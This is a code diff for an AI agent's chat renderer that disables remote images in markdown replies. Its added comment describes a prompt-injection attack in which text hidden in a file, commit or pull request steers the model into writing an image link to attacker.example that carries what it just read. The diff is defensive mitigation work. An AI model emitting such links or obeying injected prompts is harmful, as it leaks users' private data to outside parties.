@@ -10,6 +10,16 @@
 import { host } from "./bridge";
 import { el, span, glyph, copyText } from "./ui";
 import { renderMarkdown } from "./markdown";
+
+/**
+ * How every reply in a chat is rendered: with no image from the web. A model
+ * writes what it is steered to write, and a prompt hidden in a file, a commit
+ * or a pull request it reads can make it write
+ * `![](https://attacker.example/?q=<what it just read>)` — which, rendered,
+ * sends that to whoever owns the address the moment it paints. The image's alt
+ * text shows instead. (markdown.ts, MarkdownOpts.remoteImages.)
+ */
+const CHAT_MARKDOWN = { remoteImages: false } as const;
 import { highlightProse } from "./highlight";
 import { confirmDialog, toast } from "./dialogs";
 import type { AgentConfirmRequest, AgentEventWire } from "../shared/ipc";
@@ -208,7 +218,7 @@ function scheduleStreamRender(state: TurnState): void {
     // answer.
     const wrap = state.turn.parentElement;
     const stick = atBottom(wrap);
-    state.stream.innerHTML = renderMarkdown(state.raw);
+    state.stream.innerHTML = renderMarkdown(state.raw, 0, CHAT_MARKDOWN);
     if (stick) scrollDown(wrap, true);
   };
   const since = Date.now() - state.lastRenderAt;
@@ -248,7 +258,7 @@ export function finalizeStream(state: TurnState): void {
     state.stream.classList.remove("is-streaming");
     if (state.raw.trim()) {
       const block = state.stream;
-      block.innerHTML = renderMarkdown(state.raw);
+      block.innerHTML = renderMarkdown(state.raw, 0, CHAT_MARKDOWN);
       // The block is FINISHED, so highlight it — `markdownBlock` does this for
       // every other rendered answer, and a streamed one is the same content.
       // Without it a reply's code fences stayed monochrome until you left the
@@ -282,7 +292,7 @@ export function onEvent(state: TurnState, e: AgentEventWire): void {
       if (state.stream) {
         const text = e.text && e.text.trim() ? e.text : state.raw;
         const block = state.stream;
-        block.innerHTML = renderMarkdown(text);
+        block.innerHTML = renderMarkdown(text, 0, CHAT_MARKDOWN);
         block.classList.remove("is-streaming");
         highlightProse(block); // settled — see finalizeStream
         decorateMessage(block, text);
@@ -349,7 +359,7 @@ export function addBubble(transcript: HTMLElement, who: "user", text: string): v
 
 export function markdownBlock(md: string): HTMLElement {
   const block = el("div", "assistant-msg gh-body-md");
-  block.innerHTML = renderMarkdown(md);
+  block.innerHTML = renderMarkdown(md, 0, CHAT_MARKDOWN);
   highlightProse(block);
   decorateMessage(block, md);
   return block;
